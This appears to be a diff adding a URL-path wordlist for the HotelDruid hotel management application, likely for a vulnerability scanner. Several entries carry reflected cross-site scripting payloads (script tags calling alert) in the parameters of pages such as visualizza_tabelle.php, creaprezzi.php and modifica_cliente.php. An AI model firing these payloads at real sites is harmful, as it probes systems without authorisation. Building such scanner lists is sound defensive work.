@@ -1,0 +1,15 @@
+/hoteldruid/inizio.php
+/inizio.php
+/hoteldruid/visualizza_tabelle.php?anno=2019&id_sessione=&tipo_tabella=prenotazioni&subtotale_selezionate=1&num_cambia_pren=1&cerca_id_passati=1&cambia1=3134671%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/hoteldruid/visualizza_tabelle.php?nsextt=x
+/hoteldruid/visualizza_tabelle.php?anno=2019&id_sessione=&tipo_tabella=periodi&mese_fine=13
+/hoteldruid/personalizza.php?anno=2019&id_sessione=&aggiorna_qualcosa=SI&cambianumerotariffe=1&nuovo_numero_tariffe=8&origine=./creaprezzi.php
+/hoteldruid/tabella3.php?id_sessione=&mese=01&tutti_mesi=1&anno=2019
+/hoteldruid/creaprezzi.php?anno=2019&id_sessione=&ins_rapido_costo=SI&tipocostoagg=perm_min&origine=crearegole.php
+/visualizza_tabelle.php?anno=2021&tipo_tabella=prenotazioni&sel_tab_prenota=tutte&wo03b%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ew5px3=1
+/storia_soldi.php?piu17%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ee3esq=1
+/tabella.php?jkuh3%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Eyql8b=1
+/crea_modelli.php?anno=2021&id_sessione=&fonte_dati_conn=attuali&T_PHPR_DB_TYPE=postgresql&T_PHPR_DB_NAME=%C2%9E%C3%A9e&T_PHPR_DB_HOST=localhost&T_PHPR_DB_PORT=5432&T_PHPR_DB_USER=%C2%9E%C3%A9e&T_PHPR_DB_PASS=%C2%9E%C3%A9e&T_PHPR_LOAD_EXT=NO&T_PHPR_TAB_PRE=%C2%9E%C3%A9e&anno_modello=2021&lingua_modello=en&cambia_frasi=SIipq85%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ef9xkbujgt24&form_availability_calendar_template=1
+/creaprezzi.php?prezzoperiodo4=%22><script>javascript:alert(%27XSS%27)</script>
+/modifica_cliente.php?tipo_tabella=%22><script>javascript:alert(%27XSS%27)</script>&idclienti=1
+/dati/availability_tpl.php?num_app_tipo_richiesti1=%22><script>javascript:alert(%27XSS%27)</script>
